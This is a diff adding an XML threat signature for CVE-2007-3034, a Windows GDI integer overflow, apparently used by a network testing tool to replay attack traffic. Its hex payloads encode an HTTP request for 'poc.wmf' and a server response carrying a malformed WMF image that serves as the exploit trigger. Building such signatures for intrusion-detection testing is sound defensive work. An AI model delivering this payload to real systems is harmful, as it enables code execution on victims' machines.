@@ -1,0 +1,94 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Windows Graphics Rendering Engine Code Execution"/>
+    <EngDesc display="true" value="An integer overflow vulnerability exists in the Microsoft Windows graphics rendering engine. The vulnerability is a result of improper range validation when certain GDI functions are called to process malformed image data. A remote attacker can exploit this flaw to inject and execute within the security context of the currently logged in user."/>
+    <Intent display="true">
+      <item value="INTEGER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_2000"/>
+      <item value="Microsoft_Windows_XP"/>
+      <item value="Microsoft_Windows_Server_2003"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20070814-09"/>
+    <CVEID display="true" value="CVE-2007-3034"/>
+    <bugtraqID display="true" value="25302"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="a956c370bc8f03ae9d8e4c761b62da77"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-requred"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633330222546875000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1204095327" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="G">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F7E626C696E2F706F632E776D6620485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F6D73776F72642C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E30290D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="G" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C2031342041756720323030372032313A33393A343220474D540D0A5365727665723A204170616368652F322E302E3532202843656E744F5329205048502F342E332E39206D6F645F707974686F6E2F332E312E3320507974686F6E2F322E332E34206D6F645F7065726C2F322E302E31205065726C2F76352E382E350D0A4C6173742D4D6F6469666965643A205475652C2031342041756720323030372032313A33383A303520474D540D0A455461673A2022313734383238392D3331632D6138306265393430220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203739360D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F706C61696E3B20636861727365743D49534F2D383835392D310D0A0D0AD7CDC69A0000BCFE58FFF1007801E803000000009454010009000003830100000500260000000000AAFFFFFF0B027801BCFE050000000C02E0FD350207000000FC020100000000000000040000002D01000009000000FA02000000000000000000002200040000002D0101000400000004010D0009000000FA02050000000000FFFFFF002200040000002D01020007000000FC020000000000000000040000002D01030004000000060101002600000024031100DBFF7801AFFFD90050FFF90067FF9800BCFE6E0067FF42004CFFDFFFAFFFFAFFD9FF58FF0200FAFF6400DBFF4C003F00F1006C004C0092006600F8000100D800DBFF780107000000FC020000FFFFFF000000040000002D010400040000002D010200040000002D010200040000002D01040004000000060101000C00000024030400DBFF5601DBFF6C00AEFF9700DBFF5601040000002D010400040000002D010200040000002D010200040000002D01040004000000060101000C00000024030400F1FE6C00DBFF6C00AFFF3E00F1FE6C00040000002D010400040000002D010200040000002D010200040000002D01040004000000060101000C00000024030400DBFF83FFDBFF6C0007004000DBFF83FF040000002D010400040000002D010200040000002D010200040000002D01040004000000060101000C00000024030400C4006C00DBFF6C0006009900C4006C00040000002D010400040000002D010200040000002D010200040000002D01040004000000060101000C000000240304005DFFEB00A1FFA60074FF9B005DFFEB00040000002D010400040000002D010200040000002D010200040000002D01040004000000060101000C000000240304005BFFEFFFA1FF3100ACFF05005BFFEFFF040000002D010400040000002D010200040000002D010200040000002D01040004000000060101000C000000240304005800EDFF1400320041003D005800EDFF040000002D010400040000002D010200040000002D010200040000002D01040004000000060101000C000000240304005A00EA001400A6000900D3005A00EA00040000002D010400040000002D010200030000000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
